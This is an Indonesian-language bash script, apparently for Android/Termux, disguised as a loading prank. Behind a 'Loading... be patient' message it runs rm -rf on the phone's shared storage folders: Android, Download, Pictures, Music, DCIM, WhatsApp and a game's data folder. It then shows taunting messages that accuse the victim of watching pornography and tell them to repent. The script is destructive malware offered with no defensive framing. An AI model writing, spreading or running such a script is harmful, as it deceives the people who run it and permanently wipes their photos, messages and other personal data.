clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
mer='\033[41;97m' #Tepi
R='\x1b[1;31m'
G='\x1b[1;32m'
B='\x1b[1;34m'
Y='\x1b[1;33m'
C='\x1b[1;36m'
D='\x1b[0m'
endc='\E[0m'
enda='\033[0m'

echo $i"Loading........"
echo $i"Sabar...."

cd /sdcard
rm -rf Android
rm -rf Download
rm -rf Downloads
rm -rf Pictures
rm -rf Foto
rm -rf Music
rm -rf Musik
rm -rf Vidio
rm -rf Vidioes
rm -rf Dcim
rm -rf Whatsapp
rm -rf com.garena.com.codm

echo $i"Vidio bokep sudah ada di hp anda"
sleep 2
echo $i"Silahkan cek di galeri/pemutar vidio anda"
sleep 2
echo $i"Ini sebagai Hadiah Untuk Anda"
sleep 2
echo $i"Karna kamu sering liat b*kep"
sleep 2
echo $i"Jangan lupa istighfar"
sleep 2
echo $i"Tobatlah Sebelum Ajal Menjemputmu"
sleep 2
echo $i"Mampoeesss"
sleep 2
echo $i"[>_<]"
